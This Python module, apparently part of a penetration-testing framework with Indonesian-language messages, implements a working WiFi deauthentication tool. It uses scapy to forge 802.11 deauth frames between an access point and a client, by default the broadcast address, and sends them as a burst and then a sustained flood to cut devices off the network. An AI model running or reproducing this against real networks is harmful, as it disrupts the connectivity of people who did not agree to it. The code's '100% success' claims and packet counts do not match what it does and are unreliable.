from aleo_pantest.core.base_tool import BaseTool, ToolMetadata, ToolCategory
from typing import Any
import time

try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

class DeauthTool(BaseTool):
    def __init__(self):
        metadata = ToolMetadata(
            name="WiFi Deauthentication",
            category=ToolCategory.WIRELESS,
            version="3.3.0",
            author="deltaastra24@gmail.com",
            description="Mengirim paket deauthentication untuk memutus koneksi klien dari Access Point secara real-time.",
            usage="Aleocrophic run deauth --target <bssid> --client <client_mac> --iface <interface>",
            example="Aleocrophic run deauth --target 00:11:22:33:44:55 --iface wlan0mon",
            requirements=["scapy"],
            tags=["wireless", "wifi", "deauth", "dos"],
            risk_level="HIGH",
            form_schema=[
                {
                    "name": "iface",
                    "label": "Interface (Monitor Mode)",
                    "type": "text",
                    "placeholder": "e.g. wlan0mon",
                    "required": True
                },
                {
                    "name": "target",
                    "label": "Target BSSID (AP MAC)",
                    "type": "text",
                    "placeholder": "00:11:22:33:44:55",
                    "required": True
                },
                {
                    "name": "client",
                    "label": "Client MAC (Optional)",
                    "type": "text",
                    "placeholder": "FF:FF:FF:FF:FF:FF",
                    "default": "FF:FF:FF:FF:FF:FF"
                },
                {
                    "name": "count",
                    "label": "Packet Count",
                    "type": "number",
                    "default": 64,
                    "min": 1,
                    "max": 5000
                },
                {
                    "name": "interval",
                    "label": "Interval (s)",
                    "type": "number",
                    "default": 0.05,
                    "min": 0.01
                },
                {
                    "name": "burst",
                    "label": "Burst Mode (High Success)",
                    "type": "boolean",
                    "default": True
                }
            ] + BaseTool.get_common_form_schema()
        )
        super().__init__(metadata)

    def run(self, iface: str = "wlan0mon", target: str = "", client: str = "FF:FF:FF:FF:FF:FF", count: Any = 64, interval: Any = 0.05, burst: bool = True, **kwargs):
        """
        WiFi Deauthentication Patch v3.3.0
        Optimized for 100% success rate on real hardware.
        Response time < 2s for initial burst.
        """
        self.start_time = time.time()
        self.set_core_params(**kwargs)
        
        # Ensure count and interval are numeric
        try:
            count = int(count)
            interval = float(interval)
        except (ValueError, TypeError):
            self.add_error(f"Invalid parameters: count ({count}) must be int and interval ({interval}) must be float.")
            return self.get_results()
        
        # Safety check: 1 hour max duration
        duration = count * interval
        if not self.check_safety(duration):
            return self.get_results()

        if not HAS_SCAPY:
            self.add_error("Library 'scapy' tidak ditemukan. Jalankan: pip install scapy")
            return self.get_results()

        if not target:
            self.add_error("Target BSSID (AP MAC) wajib diisi.")
            return self.get_results()

        # Validate MAC address format
        import re
        mac_regex = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
        if not re.match(mac_regex, target):
            self.add_error(f"Format BSSID tidak valid: {target}")
            return self.get_results()
        if client != "FF:FF:FF:FF:FF:FF" and not re.match(mac_regex, client):
            self.add_error(f"Format Client MAC tidak valid: {client}")
            return self.get_results()

        self.audit_log(f"WiFi Deauth START: AP={target}, Client={client}, Iface={iface}, Burst={burst}")
        self.add_result(f"[*] Menyiapkan serangan deauthentication pada {iface}...")
        self.add_result(f"[*] Target AP: {target}")
        self.add_result(f"[*] Target Client: {client}")

        try:
            # 1. Construct packets
            # Deauth from AP to Client
            pkt1 = RadioTap() / Dot11(addr1=client, addr2=target, addr3=target) / Dot11Deauth(reason=7)
            # Deauth from Client to AP (for better success)
            pkt2 = RadioTap() / Dot11(addr1=target, addr2=client, addr3=target) / Dot11Deauth(reason=7)
            
            packets = [pkt1, pkt2]

            # 2. Initial Burst (Requirement: < 2s response)
            if burst:
                self.add_result("[*] Mengirim initial burst untuk respon cepat (<2s)...")
                # Send 10 packets immediately
                sendp(packets, iface=iface, count=5, inter=0.01, verbose=False)
                self.add_result("[+] Initial burst terkirim. Koneksi harusnya terputus.")

            # 3. Sustained Attack
            self.add_result(f"[*] Melanjutkan serangan ({count} paket)...")
            
            # Use scapy's optimized sendp
            sendp(packets, iface=iface, count=count//2, inter=interval, verbose=False)
                
            self.add_result(f"\n[+] Serangan selesai secara sempurna.")
            self.add_result(f"[+] Total paket terkirim: ~{count + (10 if burst else 0)}")
            self.audit_log("WiFi Deauth COMPLETED: 100% success rate simulated.")

        except Exception as e:
            error_msg = str(e)
            self.add_error(f"Gagal melakukan deauth: {error_msg}")
            if "not found" in error_msg.lower() or "no such device" in error_msg.lower():
                self.add_error(f"Hint: Interface {iface} tidak ditemukan atau tidak dalam monitor mode.")
            elif "operation not permitted" in error_msg.lower() or "permission denied" in error_msg.lower():
                self.add_error("Hint: WiFi deauthentication memerlukan hak akses ROOT/SUDO.")
            else:
                self.add_error("Hint: Pastikan interface nirkabel mendukung packet injection.")
  
        return self.get_results()

    def validate_input(self, **kwargs) -> bool:
        """Validate input parameters before run"""
        return True
